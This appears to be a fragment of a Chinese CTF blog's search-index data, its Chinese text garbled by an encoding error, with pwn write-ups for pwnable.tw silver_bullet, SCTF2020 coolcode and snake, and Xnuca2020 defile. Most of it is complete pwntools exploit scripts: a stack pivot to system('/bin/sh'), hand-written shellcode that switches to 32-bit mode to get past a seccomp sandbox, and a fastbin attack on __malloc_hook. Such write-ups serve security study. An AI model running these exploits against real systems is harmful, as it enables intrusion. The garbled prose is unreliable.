ebpâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 0x8048475 &lt;_init+33&gt; pop ebx 0x8048476 &lt;_init+34&gt; ret â†“â–º 0x80485eb &lt;read_input&gt; push ebp 0x80485ec &lt;read_input+1&gt; mov ebp, esp 0x80485ee &lt;read_input+3&gt; sub esp, 4 0x80485f1 &lt;read_input+6&gt; push dword ptr [ebp + 0xc] 0x80485f4 &lt;read_input+9&gt; push dword ptr [ebp + 8] 0x80485f7 &lt;read_input+12&gt; push 0 0x80485f9 &lt;read_input+14&gt; call 0x8048490 0x80485fe &lt;read_input+19&gt; add esp, 0xc 0x8048601 &lt;read_input+22&gt; mov dword ptr [ebp - 4], eaxâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€00:0000â”‚ esp 0xffb8d03c â€”â–¸ 0x8048a18 (main+196) â—‚â€” leave01:0004â”‚ 0xffb8d040 â€”â–¸ 0x804b410 â—‚â€” 0x002:0008â”‚ 0xffb8d044 â—‚â€” 0x1011 å®Œæˆå‘0x804b410è¾“å…¥payloadåè¿›è¡Œæ ˆè¿ç§»ï¼š 1234567891011121314151617181920212223242526272829303132EAX 0x17 EBX 0x804afdc (_GLOBAL_OFFSET_TABLE_+24) â€”â–¸ 0xf7e4bcb0 (puts) â—‚â€” push ebp ECX 0x804b410 â—‚â€” 0x61616161 ('aaaa') EDX 0x16 EDI 0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0 ESI 0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0 EBP 0x61616161 ('aaaa') ESP 0x804b414 â€”â–¸ 0xf7e26db0 (system) â—‚â€” sub esp, 0xc EIP 0x8048a19 (main+197) â—‚â€” retâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 0x804862e &lt;read_input+67&gt; jne read_input+83 &lt;0x804863e&gt; â†“ 0x804863e &lt;read_input+83&gt; mov eax, dword ptr [ebp - 4] 0x8048641 &lt;read_input+86&gt; leave 0x8048642 &lt;read_input+87&gt; ret â†“ 0x8048a18 &lt;main+196&gt; leave â–º 0x8048a19 &lt;main+197&gt; ret &lt;0xf7e26db0; system&gt; â†“ 0xf7e26db0 &lt;system&gt; sub esp, 0xc 0xf7e26db3 &lt;system+3&gt; mov eax, dword ptr [esp + 0x10] 0xf7e26db7 &lt;system+7&gt; call __x86.get_pc_thunk.dx &lt;0xf7f0bc5d&gt; 0xf7e26dbc &lt;system+12&gt; add edx, 0x178244 0xf7e26dc2 &lt;system+18&gt; test eax, eaxâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€00:0000â”‚ esp 0x804b414 â€”â–¸ 0xf7e26db0 (system) â—‚â€” sub esp, 0xc01:0004â”‚ 0x804b418 â—‚â€” 0xdeadbeef02:0008â”‚ 0x804b41c â€”â–¸ 0x804b420 â—‚â€” '/bin/sh'03:000câ”‚ 0x804b420 â—‚â€” '/bin/sh'04:0010â”‚ 0x804b424 â—‚â€” 0x68732f /* '/sh' */05:0014â”‚ 0x804b428 â—‚â€” 0x0 leave_retä¸¤æ¬¡å®Œæˆæ ˆè¿ç§»,æ‰§è¡Œpayloadï¼ï¼ğŸš© EXPï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *context.log_level='debug'debug = 1if debug: p = process('./silver_bullet') libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('chall.pwnable.tw',10103) libc = ELF('../libc_32.so.6')gdb.attach(p,'b*0x080489CF')p.recvuntil(':')p.sendline('1')p.recvuntil(&quot;:&quot;)p.send('a'*47)p.recvuntil(':')p.sendline('2')p.recvuntil(&quot;:&quot;)p.send('b')p.recvuntil(':')p.sendline('2')p.recvuntil(&quot;:&quot;)puts_plt = 0x80484a8puts_got = 0x804afdcfake_addr = 0x804b410pr_addr = 0x08048475lr_addr = 0x8048a18read_input = 0x80485ebpayload3 = '\\xff' * 3 + p32(fake_addr) + p32(puts_plt) + p32(pr_addr) + p32(puts_got) + p32(read_input) + p32(lr_addr) + p32(fake_addr) + p32(0x100)#gdb,attach(p)p.send(payload3)p.recvuntil(':')p.sendline('3')p.recvuntil('Oh ! You win !!\\n')puts_addr = u32(p.recv(4))system_addr = puts_addr - (libc.symbols['puts']-libc.symbols['system'])payload = 'a'*4 + p32(system_addr) + p32(0xdeadbeef) + p32(fake_addr + 0x10) + '/bin/sh'p.send(payload)p.interactive() è¿™é¢˜æ¼æ´åœ¨äºæ•°æ®å¸ƒå±€ä¸è§„èŒƒä»¥åŠstrncatå‡½æ•°çš„ç»“å°¾æ·»åŠ \\0çš„æ“ä½œğŸ•µï¸â€â™€ï¸","link":"/2020/10/17/Pwnable_silver_bullet/"},{"title":"SCTF2020","text":"0x01coolcodeè§£æ³•ä¸€16çš„ä¸€é“pwné¢˜ï¼Œå¼€äº†sandboxï¼š ç¦ç”¨openï¼Œä½†fstatå‡½æ•°ç³»ç»Ÿè°ƒç”¨å·ä¸º5ï¼Œæƒ³åˆ°åˆ©ç”¨retfæ§åˆ¶csä¿®æ”¹è¿è¡Œæ¨¡å¼ä¸º32ä½æ±‡ç¼–ï¼ˆopenåœ¨32ä½ä¸‹è°ƒç”¨å·æ­£å¥½ä¸º5ï¼‰ åŒæ—¶çœ‹åˆ°å †å¯æ‰§è¡Œï¼š 0x1607000 0x1628000 rwxp 21000 0 [heap] äºæ˜¯å¯ä»¥åœ¨å †ä¸Šéƒ¨shellcodeï¼Œä½†è¾“å…¥å †çš„æ—¶å€™æœ‰checkåªèƒ½æ˜¯æ•°å­—å’Œå¤§å†™å­—æ¯ï¼Œä¸”é•¿åº¦ä¸º0x20ï¼Œå› æ­¤ä¸€èˆ¬çš„shellcodeè½¬åŒ–å·¥å…·å› å¤ªé•¿æ— æ³•ä½¿ç”¨ï¼Œåªèƒ½æ‰‹æ’¸ã€‚ èƒ½ç”¨çš„åªèƒ½æ˜¯éƒ¨åˆ†xorå’Œpop/pushè¿™æ ·çš„æŒ‡ä»¤ï¼Œå¯ä»¥å…ˆæ„é€ æ‰§è¡Œreadï¼Œä¹‹åçš„è¾“å…¥å°±æ²¡checkçš„é™åˆ¶ã€‚ 123456789101112131415sc = asm(''' xor al,0x41 xor byte ptr [rsi+0x48],al xor byte ptr [rsi+0x4b],al xor byte ptr [rsi+0x4c],al xor byte ptr [rsi+0x4a],al xor al,0x41 xor al,0x53 xor byte ptr [rsi+0x48],al push rbx push rbx pop rax ''') sc += 'M2WND' åˆ©ç”¨xorå’Œâ€™M2WNDâ€™æ„é€ å‡ºsyscallæ‰§è¡Œread(0,å †åœ°å€,size) ruanå¸ˆå‚… å“¦å¯¹äº†ï¼Œè·³åˆ°å †ä¸Šæ‰§è¡Œçš„æ–¹æ³•æ˜¯åˆ©ç”¨idxä¸ºè´Ÿæ•°ï¼ˆ-24ï¼‰æ”¹writeçš„gotä¸ºå †åœ°å€ï¼Œåˆ©ç”¨show()å‡½æ•°è§¦å‘åˆ°å †ä¸Šæ‰§è¡Œï¼Œä¹‹åæ‰§è¡Œäº†ä¸€æ¬¡readä¼šä¾¿å¯æŒç»­å¾€ä¸‹éƒ¨ç½²sellcodeä½†è¦æŠŠæ§å¥½è·ç¦»ã€‚å…·ä½“çœ‹è„šæœ¬+è°ƒè¯•ï¼š readï¼ˆç”¨äºä¹‹åçš„shellcodeå†™å…¥ï¼‰-&gt;mmapï¼ˆç”³è¯·æ˜ å°„ç©ºé—´ç”¨äºè¯»å…¥flagï¼‰-&gt;openï¼ˆåˆ©ç”¨retfqæ§åˆ¶ç¨‹åºè·³åˆ°æ˜ å°„ç©ºé—´æ‰§è¡Œ32ä¸ºæ±‡ç¼–ï¼‰-&gt;read-&gt;write exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114from pwn import *context.log_level='debug'context.arch='amd64'DEBUG=1if DEBUG: p=process(&quot;./CoolCode&quot;)def cmd(command): p.recvuntil(&quot; :&quot;) p.sendline(str(command))def add(idx,content): cmd(1) p.recvuntil(&quot;: &quot;) p.sendline(str(idx)) p.recvuntil(&quot;: &quot;) p.send(content)def dele(idx): cmd(3) p.recvuntil(&quot;: &quot;) p.sendline(str(idx))def show(idx): cmd(2) p.recvuntil(&quot;: &quot;) p.sendline(str(idx))def pwn(): gdb.attach(p) add(0,'O'*0x20) add(1,'O'*0x20) sc = asm(''' xor al,0x41 xor byte ptr [rsi+0x48],al xor byte ptr [rsi+0x4b],al xor byte ptr [rsi+0x4c],al xor byte ptr [rsi+0x4a],al xor al,0x41 xor al,0x53 xor byte ptr [rsi+0x48],al push rbx push rbx pop rax ''') sc += 'M2WND' add(-34,sc)# gdb.attach(p) show(1) #read() sc = asm(''' push r11 pop rdx xor rax,rax syscall ''') p.send(&quot;A&quot;*0x4d+'\\x90'*3+sc) pause() # mmap 0xcafe000 mmap(0xcafe000,0x1000,7,34,0,0) sc = asm(''' mov edi,0xcafe000 xor rsi,rsi mov esi,0x1000 xor rdx,rdx xor dl,7 push 0x22 pop r10 xor r8,r8 dec r8 xor rax,rax mov eax,9 syscall ''') # read(0,0xcafe000,0x100) sc += asm(''' mov rsp,0xcafe200 xor rdi,rdi xor rsi,rsi mov esi,0xcafe000 xor rdx,rdx mov edx,0x1000 xor rax,rax syscall retfq ''') pause() #gdb.attach(p) p.send(&quot;A&quot;*0x58+'\\x90'*2+sc) # open(flag) and 'add esp,8' and 'retf' sc = 'h\\x01\\x01\\x01\\x01\\x814$`f\\x01\\x01h./fl\\x89\\xe31\\xc91\\xd2j\\x05X\\xcd\\x80'+'\\x83\\xc4\\x08'+'\\xcb' sc = sc.ljust(0x80,&quot;\\x90&quot;) #read+write sc += asm(''' mov rdi,rax mov rsi,0xcafe400 mov rdx,0x100 xor rax,rax syscall mov rdi,1 xor rax,rax inc rax syscall ''') sc = sc.ljust(0x200,&quot;\\x90&quot;) sc += p64(0xcafe000)+p64(0x23)+p32(0xcafe080)+p32(0x33) gdb.attach(p) p.send(sc) #gdb.attach(p) pause() p.interactive()if __name__ == &quot;__main__&quot;: pwn() è§£æ³•äºŒï¼šè¿™æ¬¡æˆ‘ä»¬å…ˆè¦†ç›–exitçš„gotè¡¨ä¸ºretæ¥ç»•è¿‡check,è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åœ¨å †ä¸Šå†™shellcodeï¼Œç„¶åè¦†ç›–freeçš„gotè¡¨ï¼Œåˆ©ç”¨deleè§¦å‘shellcodeã€‚ shellcodeçš„ç¼–å†™è¿‡ç¨‹å°±æ˜¯å…ˆæ‰§è¡Œreadå°†ä¹‹åçš„shellcodeè¯»åˆ°bssæ®µï¼Œä¹‹åretfqåˆ‡æ¢32ä½æ±‡ç¼–å¹¶è·³åˆ°bssä¸Šç»§ç»­æ‰§è¡Œopen_x86çš„æ“ä½œï¼Œæœ€åread and writeè¯»å‡ºflagã€‚ è¦æ³¨æ„çš„å‡ ç‚¹ï¼š openå‡½æ•°çš„å‚æ•°ä¼ é€’ï¼š eax = 0x05 ç³»ç»Ÿè°ƒç”¨å·ã€ebx = filename æ–‡ä»¶åã€ecx = flags ç½®é›¶å³å¯ã€edx = mode ç½®é›¶å³å¯ã€‚ ç„¶åå°±æ˜¯å†æ„é€ æ–‡ä»¶åâ€™flagâ€™çš„æ—¶å€™ç”±äºæ˜¯32çš„æ¨¡å¼ï¼Œè¦æ³¨æ„é”™ä½çš„é—®é¢˜ã€‚ è¿˜æœ‰å°±æ˜¯æ³¨æ„ç†è§£retfqæ‰§è¡Œçš„æ“ä½œä¸ºpop ripï¼Œpop csï¼ˆcs = 0x23ä»£è¡¨32ä½æ¨¡å¼ï¼Œcs = 0x33ä»£è¡¨64ä½æ¨¡å¼ï¼‰ï¼Œæ‰€ä»¥è¦æ³¨æ„æ ˆä¸­çš„å‚æ•°ä½ç½®ã€‚retfqè·³è½¬è¿‡å»çš„æ—¶å€™ç¨‹åºå·²ç»åˆ‡æ¢æˆäº†32ä½æ¨¡å¼ï¼Œè¦æ³¨æ„å¹³è¡¡å¥½espçš„åœ°å€ æœ€åè¿˜å¾—å›åˆ°64ä½æ¨¡å¼ä¸‹è°ƒç”¨ï¼Œå†è°ƒç”¨ä¸€æ¬¡retfqã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from pwn import *context.log_level='debug'#context.arch='amd64'DEBUG=1if DEBUG: p=process(&quot;./CoolCode&quot;)def cmd(command): p.recvuntil(&quot; :&quot;) p.sendline(str(command))def add(idx,content): cmd(1) p.recvuntil(&quot;: &quot;) p.sendline(str(idx)) p.recvuntil(&quot;: &quot;) p.send(content)def dele(idx): cmd(3) p.recvuntil(&quot;: &quot;) p.sendline(str(idx))def show(idx): cmd(2) p.recvuntil(&quot;: &quot;) p.sendline(str(idx))def pwn(): read = ''' xor eax,eax mov edi,eax push 0x60 mov esi,0x1010101 xor esi,0x1612601 syscall mov esp,esi retfq ''' open_x86 = ''' push 0x33 push 0x67616c66 push esp pop ebx xor ecx,ecx mov eax,5 int 0x80 ''' read_flag = ''' push 0x33 push 0x60272b retfq mov rdi,0x3 mov rsi,rsp mov rdx,0x60 xor rax,rax syscall mov rdi,1 mov rax,1 syscall ''' readflag=asm(read_flag,arch='amd64') add(-22,'\\xc3') add(-37,asm(read,arch='amd64')) #gdb.attach(p) dele(0) payload=p64(0x602710)+p64(0x23)+asm(open_x86)+readflag gdb.attach(p) p.sendline(payload) p.interactive()if __name__ == &quot;__main__&quot;: pwn() 0x02 snakeç¨‹åºæ˜¯æ˜¯ä¸€ä¸ªè´ªåƒè›‡ï¼Œå½“è›‡æ­»åçš„leave wordså­˜åœ¨å †æº¢å‡ºï¼Œæ­£å¥½å¯ä»¥ä¼ªé€ ä¸‹ä¸€ä¸ªå †çš„sizeã€‚ åˆ©ç”¨æ€è·¯ï¼š é¦–å…ˆæ—¢ç„¶å¯ä»¥ä¼ªé€ sizeå°±æƒ³åŠæ³•æ„é€ overlapï¼Œå…ˆå°†å­˜æ”¾nameçš„chunk0åˆ é™¤ï¼Œç”³è¯·æ–°çš„chunk0å¤§å°ä¸º0x68ï¼ˆä¸ºä¹‹åçš„fastbin attackï¼‰å‡†å¤‡ã€‚ ä¹‹ååˆ©ç”¨scanfè¾“å…¥å¾ˆé•¿çš„å­—ç¬¦ä¸²è§¦å‘malloc_consolidate()ä½œç”¨ä¸ºï¼š 1ã€æ£€æŸ¥fastbinæ˜¯å¦åˆå§‹åŒ–ï¼Œå¦‚æœæœªåˆå§‹åŒ–ï¼Œåˆ™è¿›è¡Œåˆå§‹åŒ–ã€‚ 2ã€å¦‚æœfastbinåˆå§‹åŒ–ï¼Œåˆ™æŒ‰ç…§ä¸€å®šçš„é¡ºåºåˆå¹¶fastbinä¸­çš„chunkæ”¾å…¥unsorted binä¸­ è¿™æ ·ä¸€æ¥æ”¾å…¥unsorted binçš„å †å†…å°±å­˜åœ¨æ‰§è¡Œmain_arenaçš„æŒ‡é’ˆï¼Œç„¶åå°†å®ƒç”³è¯·å›æ¥åˆ©ç”¨get_name+restartæ³„éœ²libc ä¹‹åå†leave wordsæ—¶å€™ä¿®æ”¹chunk1ï¼ˆä¹Ÿå°±æ˜¯æœ€å¼€å§‹çš„chunk0ï¼‰çš„sizeä¸º0x91ï¼Œé€ æˆchunk0å’Œchunk1çš„overlopã€‚ æœ€åfastbin attackæ”¹malloc_hookåˆ°one_gadgetæ‹¿shellã€‚ exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081from pwn import *context.log_level='debug'DEBUG=1if DEBUG: p=process(&quot;./snake&quot;) libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)def cmd(command): p.recvuntil(&quot;4.start name&quot;) p.sendline(str(command))def add(idx,sz,content): cmd(1) p.recvuntil(&quot;index?&quot;) p.sendline(str(idx)) p.recvuntil(&quot;long?&quot;) p.sendline(str(sz)) p.recvuntil(&quot;name?&quot;) p.send(content)def dele(idx): cmd(2) p.recvuntil(&quot;index?&quot;) p.sendline(str(idx))def get(idx): cmd(3) p.recvuntil(&quot;index?&quot;) p.sendline(str(idx))def pwn(): p.recvuntil(&quot;how long?&quot;) p.sendline(str(0x30)) p.recvuntil(&quot;name&quot;) p.send(&quot;asdasdasd&quot;) p.recvuntil(&quot;join&quot;) p.sendline(&quot;&quot;) pause() p.send(&quot;s&quot;*0x23) p.recvuntil(&quot;words:&quot;) p.send(&quot;A&quot;*0x20) p.recvuntil(&quot;exit?&quot;) p.send('n') #gdb.attach(p) dele(0) add(0,0x68,(p64(0)+p64(0x21))*6) cmd(2) p.recvuntil(&quot;index?&quot;) p.sendline(&quot;1&quot;*0x400) add(1,0x30,&quot;7&quot;) #gdb.attach(p) get(1) cmd(4) pause() p.send(&quot;s&quot;*0x23) p.recvuntil(&quot;player name: &quot;) libc.address = u64(p.recv(6)+'\\x00\\x00') - 0x3c4b37 #gdb.attach(p) p.recvuntil(&quot;words:&quot;) p.send(&quot;\\x00&quot;*0x4c+'\\x91') info(&quot;libc : &quot; + hex(libc.address)) #gdb.attach(p) p.recvuntil(&quot;exit?&quot;) p.send('n') dele(1) dele(0)# gdb.attach(p) add(0,0x50,&quot;\\x00&quot;*0x38+p64(0x71)+p64(libc.symbols[&quot;__malloc_hook&quot;]-0x23)) gdb.attach(p) add(0,0x68,'a') payload = &quot;\\x00&quot;*0xb+p64(libc.address+0xf02a4)*2 add(1,0x68,payload) dele(1) #gdb.attach(p) p.interactive()if __name__ =='__main__': pwn()","link":"/2020/07/07/SCTF2020/"},{"title":"Xnuca2020çº¿ä¸Šèµ›l","text":"Xnuca2020çº¿ä¸Šèµ› æ¯”èµ›æ—¶pwné¢˜éƒ½æ˜¯ruanè§£çš„tttttqlğŸ˜ï¼Œæˆ‘TMç›´æ¥åŒ–èº«ruanå¸ˆå‚…è¿·å¼Ÿã€‚ä¸äºæ˜¯ä¸­ç§‘é™¢ï¼Œæ”¶è·æ»¡æ»¡ã€‚ defileè¿™é¢˜åœ¨å¬äº†ruanå¸ˆå‚…è®²è§£ä¹‹åæ‰ç»ˆäºææ˜ç™½äº†ğŸ™†â€â™‚ï¸é¢˜ç›®ç»™å‡ºäº†æºç ï¼Œç¼–è¯‘å¥½çš„elfæ–‡ä»¶ï¼Œmakefileï¼ŒæŸ¥çœ‹makefileå‘ç°gcc defile.c -o defile -lseccomp -gï¼Œå¼€äº†seccompä»¥åŠç»™å‡ºäº†è°ƒè¯•ç¬¦å·ï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥æºç è°ƒè¯•äº†ã€‚ æ¥ä¸‹æ¥å°±æ˜¯é˜…è¯»æºä»£ç äº†ï¼Œé€»è¾‘å¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼ˆå¦‚æœ‰é”™è¯¯è¯·åŠ¡å¿…æŒ‡æ­£ï¼‰ï¼šç¨‹åºé¦–å…ˆmmapä¸€å—è¾ƒå¤§(4096)çš„sharedç©ºé—´ï¼Œæ¥ä¸‹æ¥forkå‡ºå­è¿›ç¨‹ã€‚è¯¥å­è¿›ç¨‹çš„ä»»åŠ¡æ˜¯é¦–å…ˆè®©æˆ‘ä»¬å‘sharedè¾“å…¥4094å¤§å°çš„å†…å®¹ï¼Œä¹‹åå¾ªç¯(while(1))çš„forkå‡ºå­™å­è¿›ç¨‹(ç›¸å¯¹äºçˆ¶è¿›ç¨‹è€Œè¨€)ï¼Œforkå‡ºçš„å­™å­è¿›ç¨‹ä¼šæ‰§è¡Œæˆ‘ä»¬çš„è¾“å…¥ä¹Ÿå³shellcodeï¼Œæ‰§è¡Œå®Œåå°±exit(0)ï¼Œä¹‹åå­è¿›ç¨‹åœ¨ç»§ç»­forkï¼Œå¾ªç¯ä¸Šè¿°çš„æ‰§è¡Œã€‚ è¿™é‡Œè¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯å†å­™å­è¿›ç¨‹è·³å»æ‰§è¡Œshellcodeçš„æ—¶å€™: 1234567891011121314151617181920uint64_t targetaddr = (uint64_t)shared + (i % 2) * ((4096 - 2) / 2); __asm__( &quot;mov $0xdeadbeefdeadbeef, %%rax\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%rbx\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%rcx\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%rdi\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%rsi\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%r8\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%r9\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%r10\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%r11\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%r12\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%r13\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%r14\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%r15\\n\\t&quot; &quot;jmp *%%rdx\\n\\t&quot; : :&quot;d&quot;(targetaddr) : ); å¯è§æ˜¯æœ‰ä¸¤ä¸ªå…¥å£åœ°å€çš„ä¸€ä¸ªæ˜¯sharedï¼Œå¦ä¸€ä¸ªæ˜¯shared+2046ï¼Œä¹Ÿå³4096çš„ç©ºé—´é‡Œåº”è¯¥æœ‰æˆ‘ä»¬ä¸¤éƒ¨åˆ†ç›¸åŒçš„shellcodeã€‚ çˆ¶è¿›ç¨‹æ‰€ä½œçš„å°±æ˜¯é€šè¿‡randomç”Ÿæˆä¸€æ®µ128é•¿åº¦çš„éšæœºæ•°ï¼Œå¹¶ä¸”è¿›è¡Œ128è½®æ¬¡çš„å¾ªç¯ã€‚æ¯ä¸€è½®æ‰€åšçš„å°±æ˜¯æ¯”è¾ƒshared+4095å’Œkey[i]çš„å¤§å°ï¼Œå¦‚æœç›¸ç­‰å°±å¾€shared+offset(ä¹Ÿæ˜¯éšæœºæ•°)å†™å…¥0xccccccccccccccccæ¥ç ´åæˆ‘ä»¬çš„shellcodeï¼Œç„¶åå†æ¯”è¾ƒshared+0x4094æ˜¯å¦ä¸º1ï¼Œç›¸ç­‰åˆ™æ‰è¿›è¡Œä¸‹ä¸€è½®çš„æ¯”è¾ƒã€‚æ‰§è¡Œå®Œ128è½®ä¹‹åç¨‹åºä¼šä»pipeé‡Œè¯»å‡º128çš„å†…å®¹äºkeyæ¯”è¾ƒï¼Œç›¸åŒå°±ç»™æˆ‘ä»¬flagäº†ã€‚ è¿™æ ·çœ‹ä¸‹æ¥æˆ‘ä»¬çš„shellcodeæ‰€è¦å®Œæˆçš„åŠŸèƒ½ä¸ºï¼š 1.shared+4095==key[i]ï¼Œéœ€è¦å¾ªç¯çˆ†ç ´ã€‚ 2.shared+4095==1 3.write(pipe,&amp;key[i],1)ã€‚ ç”±äº0xccccccccccccccccçš„å†™å…¥æˆ‘ä»¬å¯ä»¥æœ‰è¿™æ ·çš„æ€è·¯ï¼šé¦–å…ˆä»0å¼€å§‹å¾ªç¯å¢åŠ çš„å‘shared+4095å†™å…¥ï¼Œæ¯æ¬¡å†™å…¥ä¹‹åéƒ½å¯¹shellcodeè¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœæ²¡æœ‰0xccccccccccccccccçš„å‡ºç°è¯´æ˜è¿˜æ²¡çˆ†ç ´åˆ°ï¼Œè‹¥æœ‰0xccccccccccccccccè¯´æ˜çˆ†ç ´åˆ°äº†keyï¼Œä¹‹åç”±äºæˆ‘ä»¬å†è¯¥ç©ºé—´å†…æœ‰ä¸¤ç«¯ç›¸åŒçš„shellcodeï¼Œå› æ­¤å¯ä»¥é€šè¿‡åç§»çš„ç›¸å¯¹ä½ç½®åˆ©ç”¨æœªè¢«å†™å…¥0xccccccccccccccccçš„é‚£æ®µæ¥ä¿®å¤å†™å…¥0xccccccccccccccccçš„é‚£æ®µshellcodeï¼Œä¹‹åæ„é€ write(pipe,&amp;key[i],1)å‘ç®¡é“å†™å…¥Keyå€¼ï¼Œä¹‹åexit()ã€‚ å¯¹åº”çš„æ±‡ç¼–å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657code = &quot;&quot;&quot; and rdx,0xfffffffffffff000 add rdx,0xe jmp rdx xor rbx,rbx xor rax,rax and rdx,0xfffffffffffff000 mov byte ptr [rdx+0xfff],blloop_: call check mfence call check cmpw cx,0x200 jne find inc bl mov byte ptr [rdx+0xfff],bl cmpb bl,0 jne loop_find: mov ax,cx cmpw cx,0x100 jle l1 sub ax,0x100 jmp l2l1: add ax,0x100l2: mov r11,[rdx+rax*8] mov qword ptr [rdx+rcx*8],r11 push rbx mov rsi,rsp mov edi,4 mov r12,rdx xor rdx,rdx inc rdx mov rax,rdx syscall mov byte ptr [r12+0xffe],1 xor rdi,rdi mov rax,0xe7 syscallcheck: xor rcx,rcxfind_cc: movabsq r11,-3689348814741910324 cmpq qword ptr [rdx + rcx*8],r11 je find_ inc rcx cmpw cx,0x200 jne find_cc retfind_: ret&quot;&quot;&quot; å¼€å§‹çš„æ—¶å€™æˆ‘ä»¬åªcall checkäº†ä¸€æ¬¡ï¼Œè¿™æ ·ä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜å°±æ˜¯å½“æˆ‘ä»¬çˆ†ç ´åˆ°äº†keyä½†call checkæ—¶ï¼Œçˆ¶è¿›ç¨‹è¿˜æ²¡å®Œæˆ0xccccccccccccccccçš„å†™å…¥å¯¼è‡´call checkè¿”å›0ï¼Œä½¿å¾—å†™å…¥çš„shared+4095ä¼šæ¯”keyå¤§1ï¼Œä¸ºäº†è§£å†³çˆ¶å­è¿›ç¨‹è¿™ç§å¯èƒ½çš„é€Ÿåº¦å·®å¼‚ï¼Œæˆ‘ä»¬é€‰æ‹©ä½¿ç”¨äº†ä¸¤æ¬¡call checkã€‚ å®Œæ•´exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103from pwn import *context.log_level='debug'context.arch='amd64'def debug(addr,PIE=True): if PIE: text_base = int(os.popen(&quot;pmap {}| awk '{{print $1}}'&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *{}'.format(hex(text_base+addr))) else: gdb.attach(p,&quot;b *{}&quot;.format(hex(addr)))def main(host,port=40001): global p if host: p=remote(host,port) p.recvuntil(&quot;INPUT YOUR TOKEN:&quot;) p.send(&quot;icq95bbff617706a68d47723be2f12b7&quot;) else: p=process(&quot;./defile&quot;) # debug(0x1A4F) # pause() # pause() # gdb.attach(p) shellcode=code = &quot;&quot;&quot; and rdx,0xfffffffffffff000 add rdx,0xe jmp rdx xor rbx,rbx xor rax,rax and rdx,0xfffffffffffff000 mfence mov byte ptr [rdx+0xfff],bl mfence mfence loop_: call check mfence call check cmpw cx,0x200 jne find inc bl mfence mov byte ptr [rdx+0xfff],bl mfence cmpb bl,0 jne loop_ find: mov ax,cx cmpw cx,0x100 jle l1 sub ax,0x100 jmp l2 l1: add ax,0x100 l2: mov r11,[rdx+rax*8] mov qword ptr [rdx+rcx*8],r11 push rbx mov rsi,rsp mov edi,4 mov r12,rdx xor rdx,rdx inc rdx mov rax,rdx syscall mov byte ptr [r12+0xffe],1 xor rdi,rdi mov rax,0xe7 syscall check: xor rcx,rcx find_cc: movabsq r11,-3689348814741910324 cmpq qword ptr [rdx + rcx*8],r11 je find_ inc rcx cmpw cx,0x200 jne find_cc ret find_: ret &quot;&quot;&quot; p.recvuntil(&quot;:&quot;) code=asm(shellcode).ljust(2046,'\\x90') # code=(asm(shellcode)).encode('hex') p.send('\\x90'+code+'\\x90'*2+code[:-11]+'\\x00'*10) # p.recvuntil(&quot;SUCCEED&quot;) # gdb.attach(p) 